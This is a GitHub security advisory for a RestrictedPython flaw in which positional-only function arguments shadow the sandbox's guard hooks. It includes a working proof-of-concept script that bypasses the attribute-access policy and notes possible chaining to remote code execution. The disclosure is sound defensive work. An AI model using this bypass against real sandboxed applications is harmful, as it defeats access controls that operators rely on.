# [H] RestrictedPython guard hooks can be shadowed via positional-only arguments

## Summary
Severity: High
Advisory: GHSA-ffg3-p8fm-mjx2
CVE: CVE-2026-55830
CWE: CWE-184
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:L (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-ffg3-p8fm-mjx2
Type: github-advisory

## Affected
- PyPI: `RestrictedPython` — affected >=0 <8.3

## Details
### Impact

RestrictedPython rewrites sensitive operations to go through guard hooks. Attribute access becomes `_getattr_(obj, name)`, item access becomes `_getitem_(obj, key)`, writes go through `_write_`, and print goes through `_print_`. The embedding application supplies these hooks to enforce its policy.

Argument-name validation rejects these protected names for regular arguments, `*args`, `**kwargs`, and keyword-only arguments, but it misses positional-only arguments (the ones before `/`). So a function like:

```python
def f(_getattr_=evil, /):
    return o.x
```

makes `_getattr_` a local that shadows the policy hook, and the rewritten access calls `evil` instead. The same works for `_getitem_`, `_write_`, and `_print_`. Shadowing `_print_` can also be used to capture the internal `_getattr_` hook that RestrictedPython passes in.

The result is that sandboxed code can bypass the access policy the embedding application relies on. In applications that also handle sandbox-controlled objects unsafely (for example serializing them with pickle), this primitive can be chained further, up to remote code execution. That part depends on the embedding application, but the underlying guard bypass is in RestrictedPython.

### Proof of concept

On an unpatched RestrictedPython this prints `shadowed` and an empty `calls` list, meaning the policy `_getattr_` never ran. With the fix, `compile_restricted` rejects the code.

```python
from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_globals, safer_getattr

calls = []
def policy_getattr(obj, name, default=None):
    calls.append(name)  # the real guard records every access
    return safer_getattr(obj, name, default)

src = """
def f(o, _getattr_=lambda obj, name: "shadowed", /):
    return o.x
"""

code = compile_restricted(src, "<s>", "exec")   # currently compiles, should be rejected
g = dict(safe_globals)
g["_getattr_"] = policy_getattr
exec(code, g)

class O:
    x = "secret"

print(g["f"](O()))   # -> "shadowed"   (attacker's local was used)
print(calls)         # -> []           (policy _getattr_ never ran)
```

### Patches

The fix validates positional-only argument names the same way the other argument kinds are already validated. It will ship in the next release.

### Workarounds

None other than upgrading. If you cannot upgrade immediately, reject any submitted code whose function or lambda definitions use positional-only parameters with leading-underscore names before compiling.

## References
- https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-ffg3-p8fm-mjx2
- https://nvd.nist.gov/vuln/detail/CVE-2026-55830
- https://github.com/zopefoundation/RestrictedPython/commit/3737596ec9f28c34a073cc845bd2f4c0a80cb671
- https://github.com/zopefoundation/RestrictedPython
